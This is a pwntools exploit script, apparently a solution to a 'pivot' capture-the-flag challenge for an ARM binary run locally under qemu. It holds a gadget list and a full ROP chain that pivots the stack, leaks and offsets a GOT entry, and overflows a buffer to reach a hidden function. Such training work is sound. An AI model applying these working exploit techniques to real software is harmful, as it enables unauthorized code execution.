from pwn import *
context(arch="arm", os="linux", endian="little", word_size=32)
io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "./pwn"])
#io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "-g", "1234", "./pwn"])

"""
.got:0002102C 54 10 02 00                   foothold_function_ptr DCD __imp_foothold_function
.plt:1064c

0x00010810 : pop {fp, pc}
0x000105d4 : pop {r3, pc}
0x000108fc : pop {r4, fp, pc}
0x00010760 : pop {r4, pc}
0x00010984 : pop {r4, r5, r6, r7, r8, sb, sl, pc}


.text:00010900 10 00 1B E5                   LDR     R0, [R11,#-16]
.text:00010904 00 00 90 E5                   LDR     R0, [R0]
.text:00010908 10 88 BD E8                   POP     {R4,R11,PC}

.text:0001090C 10 10 1B E5                   LDR     R1, [R11,#-16]
.text:00010910 01 00 80 E0                   ADD     R0, R0, R1
.text:00010914 08 00 0B E5                   STR     R0, [R11,#-8]
.text:00010918 1E FF 2F E1                   BX      LR

.text:0001091C                               CODE16
.text:0001091C A6 46                         MOV     LR, R4
.text:0001091E 3B 1C                         MOVS    R3, R7
.text:00010920 18 47                         BX      R3

.text:00010924                               CODE32
.text:00010924 08 30 1B E5                   LDR     R3, [R11,#-8]
.text:00010928 0C 70 1B E5                   LDR     R7, [R11,#-0xC]
.text:0001092C 33 FF 2F E1                   BLX     R3
"""

io.recvuntil(b'pivot: ')
addr = int(io.recvuntil(b'\n', drop=True), 16)
print(hex(addr))

r11_0 = addr+0x1c
r11_1 = addr+0x80
r11_2 = addr+0x58
rop  = p32(r11_0) + p32(0x10760) + p32(0x10984) + p32(0x10924) + p32(0x1064c) + p32(0x1091c+1) + b'r6r6' + b'r7r7' + b'r8r8' + b'sbsb' + b'slsl' + p32(0x10908)
rop += b'r4r4' + p32(r11_1) + p32(0x10900) + p32(0x10908) + p32(r11_2) + p32(0x10924) 
rop += p32(0x18c) + p32(0x1090c) + p32(0x1091c+1) + p32(0x10900)
print(hex(len(rop)))
rop  = rop.ljust(0x80-16, b'A') + p32(0x2102c)
print(hex(len(rop)))
io.sendlineafter(b'> ', rop)

pay = b'A'*0x20 + p32(addr+4) + p32(0x000108B8)
io.sendlineafter(b'> ', pay)

io.interactive()
